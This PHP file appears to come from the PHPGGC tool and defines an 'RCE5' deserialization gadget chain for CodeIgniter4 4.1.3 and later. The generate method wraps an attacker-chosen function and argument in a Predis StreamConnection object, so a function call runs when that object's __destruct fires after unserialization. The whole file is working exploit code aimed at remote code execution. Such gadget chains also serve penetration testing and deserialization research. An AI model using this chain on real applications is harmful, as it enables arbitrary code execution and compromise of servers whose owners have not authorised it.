<?php

namespace GadgetChain\CodeIgniter4;

class RCE5 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '-4.1.3+';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Predis\Connection\StreamConnection($function, $parameter);
    }
}
